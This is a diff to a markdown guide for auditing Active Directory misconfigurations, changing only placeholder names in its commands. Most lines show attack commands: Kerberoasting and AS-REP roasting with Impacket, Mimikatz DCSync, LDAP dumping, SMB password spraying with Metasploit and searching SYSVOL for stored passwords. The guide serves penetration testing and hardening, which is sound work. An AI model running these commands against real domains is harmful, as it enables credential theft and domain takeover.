@@ -16,7 +16,7 @@ This setting allows any user to join an unmanaged computer (like BYOD) to access
 
 PowerShell command:
 
-    add-computer –domainname <FQDN-DOMAIN> -Credential <DOMAIN>\<USER> -restart –force
+    add-computer –domainname <FQDN-DOMAIN> -Credential <domain>\<username> -restart –force
 
 List all computers that were added by non-admins:
 
@@ -34,7 +34,7 @@ set to 1 without being members of any privileged group exist.
 
 Collect information from the domain controller:
 
-    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>
+    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>
 
 Instead of a password, the NTLM hash can also be used (pass-the-hash).
 
@@ -60,13 +60,13 @@ From a low privileged domain account on a joined Windows machine, enumerate thes
 
 From a non-joined Windows machine, authenticate to the domain first:
 
-    runas /netonly /user:<DOMAIN>\<USER> cmd.exe
+    runas /netonly /user:<domain>\<username> cmd.exe
 
 From Linux (Kali Linux) using the `net` command:
 
-    net rpc group members 'Schema Admins' -I <DC-IP> -U "<USER>"%"<PASS>"
-    net rpc group members 'Domain Admins' -I <DC-IP> -U "<USER>"%"<PASS>"
-    net rpc group members 'Enterprise Admins' -I <DC-IP> -U "<USER>"%"<PASS>"
+    net rpc group members 'Schema Admins' -I <DC-IP> -U "<username>"%"<password>"
+    net rpc group members 'Domain Admins' -I <DC-IP> -U "<username>"%"<password>"
+    net rpc group members 'Enterprise Admins' -I <DC-IP> -U "<username>"%"<password>"
 
 ## Service accounts are members of Domain Admins
 
@@ -108,7 +108,7 @@ This attack has been automated by Impacket and Rubeus all that is required is lo
 
 ### Impacket
 
-    GetUserSPNs.py -request <DOMAIN>/<USER>:<PASS>
+    GetUserSPNs.py -request <domain>/<username>:<password>
 
 Instead of a password, an NTLM hash can be used (pass-the-hash). If some hashes are given, there are service accounts 
 vulnerable to Kerberoasting. The hashes can be exported to, for example, a `hashcat.txt` file and fed to hashcat for 
@@ -125,7 +125,7 @@ maintaining access by APT groups.
 
 Collect information from the domain controller:
 
-    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>
+    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>
 
 Get the list of users with non-expiring passwords:
 
@@ -145,7 +145,7 @@ Use low privileged domain user credentials and the ability to reach LDAP port of
 
 Collect information from the domain controller:
 
-    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>
+    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>
 
 Get the list of users with the `PASSWD_NOTREQD` flag:
 
@@ -174,7 +174,7 @@ Both methods imply a full AD domain compromise already.
 Using Mimikatz in the context of a high privileged user (who is able to perform DCSYNC), and knowing the username of 
 an affected user:
 
-    mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<AFFECTED-USER>
+    mimikatz # lsadump::dcsync /domain:<domain> /user:<AFFECTED-USER>
 
 ## Storing passwords using LM hashes
 
@@ -196,12 +196,12 @@ To test for AS-REP roasting, knowing domain user credentials is not needed. We d
 
 If we do not know any, we can try a wordlist with usernames with Impacket:
 
-    GetNPUsers.py <DOMAIN>/ -usersfile <USERLIST.TXT> -format [hashcat|john] -no-pass
+    GetNPUsers.py <domain>/ -usersfile <USERLIST.TXT> -format [hashcat|john] -no-pass
 
 If we do have low privileged domain user credentials, we can get the list of affected users with their Kerberos 
 AS-REP hashes:
 
-    GetNPUsers.py <DOMAIN>/<USER>:<PASS> -request -format [hashcat|john]
+    GetNPUsers.py <domain>/<username>:<password> -request -format [hashcat|john]
 
 If we get some hashes, we can try to crack the AS-REP hashes with hashcat using a dictionary attack:
 
@@ -228,13 +228,13 @@ Display AD password policy from a domain joined Windows machine with low privili
 
 Display AD password policy from Linux (Kali Linux) using `polenum`:
 
-    polenum --username <USER> --password <PASS> --domain <DC-IP>
+    polenum --username <username> --password <password> --domain <DC-IP>
 
 ### enum4linux
 
 Display AD password policy from Linux (Kali Linux) using `enum4linux`:
 
-    enum4linux -P -u <USER> -p <PASS> -w <DOMAIN> <DC-IP>
+    enum4linux -P -u <username> -p <password> -w <domain> <DC-IP>
 
 ## Inactive domain accounts
 
@@ -244,7 +244,7 @@ increases the attack surface for login attacks.
 
 Collect information from the domain controller:
 
-    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>
+    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>
 
 Sort the users based on their last logon date:
 
@@ -257,7 +257,7 @@ for attackers (APTs).
 
 Collect information from the domain controller:
 
-    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>
+    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>
 
 Get the list of users with `AdminCount` attribute set to 1 by parsing the `domain_users.json` file:
 
@@ -294,13 +294,13 @@ Password spraying with [minimalistic AD login bruteforcer](https://www.infosecma
 
 Get a list of AD domain users using the `net` command:
 
-    net rpc group members 'Domain Users' -I <DC-IP> -U "<USER>"%"<PASS>"
+    net rpc group members 'Domain Users' -I <DC-IP> -U "<username>"%"<password>"
 
 Do the login attack:
 
     use auxiliary/scanner/smb/smb_login
     set RHOSTS <DC-IP>
-    set SMBDomain <DOMAIN>
+    set SMBDomain <domain>
     set SMBPass file:pwdlist.txt
     set USER_FILE users.txt
     set THREADS 5
@@ -316,11 +316,11 @@ readable to all authenticated domain users. examples are:
 
 From a domain joined Windows machine:
 
-    findstr /s /n /i /p password \\\\<DOMAIN>\sysvol\<DOMAIN>\*
+    findstr /s /n /i /p password \\\\<domain>\sysvol\<domain>\*
 
 From Linux (e.g. Kali Linux):
 
-    mount.cifs -o domain=<DOMAIN>,username=<USER>,password=<PASS> //<DC-IP>/SYSVOL /tmp/mnt
+    mount.cifs -o domain=<domain>,username=<username>,password=<password> //<DC-IP>/SYSVOL /tmp/mnt
     grep -ir 'password' /tmp/mnt
 
 A cPassword attribute in the GPP XML files, for example, can be decrypted with `gpp-decrypt`.
